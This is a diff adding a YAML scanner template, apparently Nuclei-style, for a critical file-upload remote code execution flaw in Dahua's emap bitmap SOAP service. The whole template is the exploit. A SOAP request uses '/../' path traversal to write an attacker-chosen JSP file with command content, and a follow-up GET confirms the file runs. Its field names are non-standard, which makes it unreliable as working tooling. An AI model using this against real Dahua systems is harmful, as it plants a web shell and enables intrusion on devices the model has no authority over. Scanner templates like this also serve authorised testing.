@@ -1,0 +1,46 @@
+id: dahua-bitmap-fileupload
+brief:
+    title: Dahua Bitmap - File Upload Remote Code Execution
+    by: DhiyaneshDK
+    level: critical
+    about: ""
+    label:
+        - dahua
+        - file-upload
+        - rce
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/emap/webservice/gis/soap/bitmap'
+      head:
+        Content-Type: '"text/xml; charset=utf-8"'
+        Hostname: '{{Hostname}}'
+      body: |-
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
+            <soapenv:Header/>
+                <soapenv:Body>
+                        <res:uploadPicFile>
+                            <arg0>
+                            <picPath>/../{{rand_str}}.jsp</picPath>
+                            </arg0>
+                            <arg1>{{cmd}}</arg1>
+                        </res:uploadPicFile>
+                </soapenv:Body>
+        </soapenv:Envelope>
+      signs:
+        - "on": word
+          has:
+            - <soap:Envelope
+          in: body
+    - verb: GET
+      to:
+        - '{{BaseURL}}/upload/{{rand_str}}.jsp'
+      head:
+        Hostname: '{{Hostname}}'
+      signs:
+        - "on": word
+          has:
+            - '{{base64_decode(cmd)}}'
+          in: body
